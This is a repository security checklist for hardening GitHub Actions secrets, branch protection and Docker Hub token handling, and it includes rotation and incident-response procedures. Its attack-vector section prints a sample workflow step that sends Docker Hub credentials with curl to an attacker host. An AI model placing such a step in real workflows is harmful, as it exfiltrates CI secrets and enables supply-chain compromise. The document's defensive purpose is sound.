# GitHub Actions Security Checklist

**Last Updated:** 2025-10-01
**Issue Reference:** #455
**Risk Level:** 🔴 HIGH

## Executive Summary

This repository currently has **HIGH** security risks related to GitHub Actions secrets management and branch protection. Anyone with write access can modify workflows and exfiltrate sensitive credentials, particularly Docker Hub tokens.

### Current Security Posture: 🔴 CRITICAL

- **Branch Protection:** ❌ Not configured on `main` branch
- **Environment Protection:** ⚠️ Partial (5 environments exist but not fully utilized)
- **Secret Isolation:** ❌ Docker Hub secrets available to all workflows
- **Workflow Protection:** ❌ No review requirements for `.github/workflows/` changes
- **Token Permissions:** ⚠️ Unknown - needs audit

---

## Critical Findings

### 1. Docker Hub Secret Exposure (🔴 CRITICAL)

**Affected Workflows:**
- `codeserver-profiles.yml` - Uses `DOCKERHUB_USERNAME` and `DOCKERHUB_TOKEN` directly
- `build-and-push-image.yml` - References Docker Hub login (but only uses GHCR)
- `codeserver-multiarch.yml` - Has Docker login actions configured
- `docs-ci-cd.yml` - Contains Docker Hub login action
- `gitops-deployment.yml` - Contains Docker Hub login action
- `release-branch-ci.yml` - Contains Docker Hub login action

**Risk:** Any contributor with write access can:
1. Modify workflow to echo secrets to logs
2. Exfiltrate credentials to external services
3. Push malicious images to Docker Hub
4. Compromise downstream systems using these images

**Attack Vector Example:**
```yaml
# Malicious PR could add this to any workflow:
- name: "Innocent looking step"
  run: |
    curl -X POST https://attacker.com/collect \
      -d "user=${{ secrets.DOCKERHUB_USERNAME }}" \
      -d "token=${{ secrets.DOCKERHUB_TOKEN }}"
```

### 2. No Branch Protection (🔴 CRITICAL)

**Current State:**
```json
{
  "message": "Branch not protected",
  "status": "404"
}
```

**Impact:**
- Direct commits to `main` without review
- Workflow modifications bypass code review
- No required status checks before merge
- No administrator enforcement

### 3. Workflow Modification Without Review (🔴 HIGH)

**Current State:** 38+ workflow files with no protection requirements

**Risk Scenarios:**
- Compromised contributor account modifies workflows
- Insider threat exfiltrates secrets
- Accidental exposure of credentials in workflow runs
- Supply chain attacks via workflow dependencies

---

## Immediate Action Plan (Priority 1)

### Task 1: Enable Branch Protection on `main`

**Timeline:** 24 hours

```bash
# Recommended settings via GitHub CLI:
gh api repos/:owner/:repo/branches/main/protection \
  --method PUT \
  --field required_pull_request_reviews[required_approving_review_count]=1 \
  --field required_pull_request_reviews[dismiss_stale_reviews]=true \
  --field required_pull_request_reviews[require_code_owner_reviews]=true \
  --field enforce_admins=true \
  --field required_status_checks[strict]=true \
  --field required_status_checks[contexts][]=lint \
  --field required_status_checks[contexts][]=type-check \
  --field restrictions=null
```

**Required Settings:**
- ✅ Require pull request reviews (1+ approvals)
- ✅ Dismiss stale reviews when new commits are pushed
- ✅ Require review from Code Owners for workflows
- ✅ Require status checks (lint, type-check, tests)
- ✅ Enforce restrictions for administrators
- ✅ Require signed commits (recommended)

### Task 2: Create Protected Environment for Docker Hub

**Timeline:** 24 hours

**Steps:**
1. Create new environment: `docker-hub-publishing`
2. Configure environment protection:
   - Required reviewers: 1+ maintainers
   - Deployment branches: `main` only
   - Environment secrets: Move `DOCKERHUB_USERNAME` and `DOCKERHUB_TOKEN`

**Workflow Updates Required:**
```yaml
# In codeserver-profiles.yml:
jobs:
  build-profile:
    environment: docker-hub-publishing  # Add this line
    runs-on: ubuntu-latest
    # ... rest of job
```

**Files to Update:**
- `.github/workflows/codeserver-profiles.yml`
- `.github/workflows/build-and-push-image.yml` (if Docker Hub push enabled)
- `.github/workflows/codeserver-multiarch.yml`
- `.github/workflows/docs-ci-cd.yml`
- `.github/workflows/gitops-deployment.yml`
- `.github/workflows/release-branch-ci.yml`

### Task 3: Rotate Docker Hub Token with Minimal Permissions

**Timeline:** 48 hours

**Steps:**
1. Log into Docker Hub as service account
2. Generate new Personal Access Token with:
   - **Read & Write** access only (not Admin)
   - Repository scope limited to: `vibecode-codeserver`
   - Set expiration: 90 days
3. Update GitHub secret: `DOCKERHUB_TOKEN`
4. Document token in 1Password/secrets manager with:
   - Creation date
   - Expiration date
   - Scope/permissions
   - Rotation reminder

**Token Permissions Audit:**
```bash
# Current permissions: UNKNOWN - needs verification
# Recommended permissions:
#   - Public Repo: vibecode-codeserver (read/write)
#   - No admin access
#   - No organization-level access
```

### Task 4: Implement CODEOWNERS for Workflows

**Timeline:** 24 hours

Create/update `.github/CODEOWNERS`:
```
# Require security team review for workflow changes
.github/workflows/ @ryanmaclean @security-team
.github/actions/ @ryanmaclean @security-team

# Require review for Docker configuration
docker/ @ryanmaclean @devops-team
Dockerfile* @ryanmaclean @devops-team

# Security-sensitive files
docs/security/ @ryanmaclean @security-team
SECURITY.md @ryanmaclean @security-team
```

---

## Secondary Actions (Priority 2)

### Task 5: Enable Required Workflow Approval

**Timeline:** 72 hours

Configure repository settings:
- Settings → Actions → General
- Enable: "Require approval for first-time contributors"
- Enable: "Require approval for all outside collaborators"

### Task 6: Audit All Workflow Secrets

**Timeline:** 1 week

**Secrets to Review:**

| Secret Name | Used In | Risk Level | Recommended Action |
|------------|---------|------------|-------------------|
| `DOCKERHUB_USERNAME` | 1 workflow | 🔴 HIGH | Move to environment |
| `DOCKERHUB_TOKEN` | 1 workflow | 🔴 HIGH | Move to environment + rotate |
| `GITHUB_TOKEN` | All workflows | 🟢 LOW | Auto-provided, no action |
| `AZURE_CREDENTIALS` | 3 workflows | 🟡 MEDIUM | Move to `production` environment |
| `DD_API_KEY` | 5+ workflows | 🟡 MEDIUM | Validate read-only scope |
| `DD_APP_KEY` | 3 workflows | 🟡 MEDIUM | Validate minimal scope |
| `SNYK_TOKEN` | 1 workflow | 🟢 LOW | Already optional |
| `SLACK_WEBHOOK_URL` | 2 workflows | 🟢 LOW | Already optional |

### Task 7: Implement Workflow Security Best Practices

**Timeline:** 2 weeks

**Checklist:**
- [ ] Pin all actions to specific SHA (not tags)
  - Current: `uses: actions/checkout@v4`
  - Recommended: `uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4`

- [ ] Minimize `GITHUB_TOKEN` permissions per workflow
  ```yaml
  permissions:
    contents: read  # Explicit minimal permissions
    packages: write # Only what's needed
  ```

- [ ] Add workflow run approval for external PRs
- [ ] Implement workflow run logs retention policy
- [ ] Enable secret scanning (already configured)
- [ ] Enable push protection for secrets

### Task 8: Create Secret Rotation Schedule

**Timeline:** 1 week

**Rotation Policy:**

| Secret Type | Rotation Frequency | Owner | Next Rotation |
|------------|-------------------|-------|---------------|
| Docker Hub Token | 90 days | DevOps Team | 2025-12-30 |
| Azure Credentials | 180 days | Platform Team | TBD |
| Datadog API Keys | 365 days | Observability Team | TBD |
| Slack Webhooks | On compromise | DevOps Team | N/A |

**Automation:**
- Set calendar reminders 2 weeks before expiration
- Create GitHub issue template for rotation procedures
- Document rotation runbook in this file (see below)

---

## Token Rotation Procedures

### Docker Hub Token Rotation

**Prerequisites:**
- Docker Hub account access with admin permissions
- GitHub repository admin access
- 1Password/secrets manager access

**Steps:**

1. **Generate New Token:**
   ```bash
   # Log into Docker Hub web interface
   # Navigate to: Account Settings → Security → New Access Token
   # Name: vibecode-ghactions-$(date +%Y%m%d)
   # Permissions: Read & Write (vibecode-codeserver only)
   # Expiration: 90 days
   # Copy token immediately (only shown once)
   ```

2. **Update GitHub Secret:**
   ```bash
   # Via GitHub CLI (recommended):
   gh secret set DOCKERHUB_TOKEN --repo ryanmaclean/vibecode-webgui

   # Or via web UI:
   # Settings → Secrets and variables → Actions → DOCKERHUB_TOKEN → Update
   ```

3. **Verify Token Works:**
   ```bash
   # Trigger manual workflow run:
   gh workflow run codeserver-profiles.yml \
     --ref main \
     --field profiles=minimal \
     --field version=test \
     --field push_to_dockerhub=false

   # Monitor run:
   gh run watch
   ```

4. **Revoke Old Token:**
   ```bash
   # Only after verification succeeds
   # Docker Hub → Account Settings → Security → Revoke old token
   ```

5. **Document Rotation:**
   - Update 1Password entry with new creation/expiration dates
   - Update rotation schedule in this document
   - Set calendar reminder for next rotation

### Azure Credentials Rotation

**Prerequisites:**
- Azure subscription admin access
- GitHub repository admin access

**Steps:**

1. **Create New Service Principal:**
   ```bash
   az ad sp create-for-rbac \
     --name "vibecode-github-actions-$(date +%Y%m%d)" \
     --role Contributor \
     --scopes /subscriptions/<subscription-id>/resourceGroups/<rg-name> \
     --sdk-auth > azure-creds.json
   ```

2. **Update GitHub Secret:**
   ```bash
   gh secret set AZURE_CREDENTIALS < azure-creds.json
   rm azure-creds.json  # Clean up sensitive file
   ```

3. **Verify Access:**
   ```bash
   gh workflow run build-and-push-image.yml
   gh run watch
   ```

4. **Delete Old Service Principal:**
   ```bash
   az ad sp delete --id <old-sp-id>
   ```

---

## Environment Protection Setup

### Recommended Environment Structure

```
Production Environments (Protected):
├── docker-hub-publishing
│   ├── Secrets: DOCKERHUB_USERNAME, DOCKERHUB_TOKEN
│   ├── Protection: 1 required reviewer
│   └── Branches: main only
│
├── production (existing)
│   ├── Secrets: AZURE_CREDENTIALS, KUBE_CONFIG
│   ├── Protection: 2 required reviewers
│   └── Branches: main only
│
└── staging (existing)
    ├── Secrets: AZURE_CREDENTIALS (staging scope)
    ├── Protection: 1 required reviewer
    └── Branches: main, develop

Development Environments (Minimal Protection):
├── dev (existing)
│   └── No sensitive secrets
│
└── github-pages (existing)
    └── No sensitive secrets
```

### Environment Creation Commands

```bash
# Create docker-hub-publishing environment
gh api repos/:owner/:repo/environments/docker-hub-publishing \
  --method PUT \
  --field wait_timer=0 \
  --field reviewers[][type]=User \
  --field reviewers[][id]=<user-id> \
  --field deployment_branch_policy[protected_branches]=true \
  --field deployment_branch_policy[custom_branch_policies]=false

# Add secrets to environment
gh secret set DOCKERHUB_USERNAME \
  --env docker-hub-publishing \
  --body "<username>"

gh secret set DOCKERHUB_TOKEN \
  --env docker-hub-publishing \
  --body "<token>"
```

---

## Verification Checklist

### Post-Implementation Verification

- [ ] **Branch Protection Enabled:**
  ```bash
  gh api repos/:owner/:repo/branches/main/protection | jq '.required_pull_request_reviews'
  ```

- [ ] **Environment Protection Configured:**
  ```bash
  gh api repos/:owner/:repo/environments | jq '.environments[] | {name, protection_rules}'
  ```

- [ ] **Secrets Migrated to Environments:**
  ```bash
  # Should NOT show DOCKERHUB_* in repository secrets
  gh secret list

  # Should show in environment secrets
  gh secret list --env docker-hub-publishing
  ```

- [ ] **CODEOWNERS File Created:**
  ```bash
  cat .github/CODEOWNERS | grep workflows
  ```

- [ ] **Workflow Runs Require Approval:**
  - Test: Create PR from fork
  - Verify: Workflow requires manual approval
  - Result: ✅ / ❌

- [ ] **Token Permissions Validated:**
  - Test: Run workflow with new token
  - Verify: Can push to Docker Hub
  - Verify: Cannot access other repositories
  - Result: ✅ / ❌

---

## Incident Response Plan

### If Secret Exposure Detected

**Immediate Actions (0-15 minutes):**

1. **Revoke Compromised Secret:**
   ```bash
   # Docker Hub: Account Settings → Security → Revoke token
   # Azure: az ad sp delete --id <sp-id>
   # Datadog: Settings → Organization → API Keys → Revoke
   ```

2. **Disable Affected Workflows:**
   ```bash
   gh workflow disable <workflow-name>
   ```

3. **Review Recent Workflow Runs:**
   ```bash
   gh run list --limit 50 --json status,conclusion,createdAt,headBranch
   ```

4. **Check for Unauthorized Activity:**
   - Docker Hub: Activity logs for unusual pushes
   - Azure: Activity logs for resource changes
   - Datadog: Audit logs for API usage

**Short-term Actions (15 minutes - 2 hours):**

5. **Generate New Credentials:**
   - Follow rotation procedures above
   - Use emergency rotation without waiting period

6. **Audit All Workflows:**
   ```bash
   git log --all --oneline -- .github/workflows/
   git diff HEAD~10 -- .github/workflows/
   ```

7. **Review PRs and Commits:**
   - Check recent merged PRs touching workflows
   - Identify potential malicious changes

8. **Re-enable Workflows:**
   - Only after new secrets configured
   - Test with manual trigger first

**Long-term Actions (2+ hours):**

9. **Root Cause Analysis:**
   - How was secret exposed?
   - What controls failed?
   - Who had access?

10. **Implement Additional Controls:**
    - Enhance branch protection
    - Add additional reviewers
    - Implement secret scanning alerts

11. **Document Incident:**
    - Create incident report in `docs/security/incidents/`
    - Update this checklist with lessons learned
    - Share findings with team

---

## Compliance and Audit

### Quarterly Security Review

**Schedule:** Last week of each quarter

**Review Items:**
- [ ] All workflow files audited for security issues
- [ ] Secret expiration dates verified
- [ ] Environment protection rules still appropriate
- [ ] Branch protection rules still enforced
- [ ] No unauthorized workflow runs detected
- [ ] All actions pinned to specific SHAs
- [ ] CODEOWNERS file up to date
- [ ] Incident response plan tested

### Annual Penetration Testing

**Scope:**
- Attempt to exfiltrate secrets via PR
- Test branch protection bypass methods
- Validate environment protection
- Review audit logs for suspicious activity

---

## Additional Resources

### GitHub Documentation
- [Encrypted Secrets](https://docs.github.com/en/actions/security-guides/encrypted-secrets)
- [Security Hardening for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [Using Environments for Deployment](https://docs.github.com/en/actions/deployment/targeting-different-environments/using-environments-for-deployment)

### Internal Documentation
- [SECURITY.md](/docs/SECURITY.md) - General security policy
- [BINARY_VERIFICATION_FRAMEWORK.md](/docs/security/BINARY_VERIFICATION_FRAMEWORK.md) - Binary verification

### Related Issues
- #455 - [Security] Harden GitHub Actions secrets and branch protection
- #416 - Related security issue (referenced in #455)

---

## Change Log

| Date | Author | Change |
|------|--------|--------|
| 2025-10-01 | DevOps Architect | Initial security assessment and checklist creation |

---

## Approval and Sign-off

**Security Review:** Pending
**Platform Team Review:** Pending
**Implementation Start Date:** TBD
**Target Completion Date:** TBD
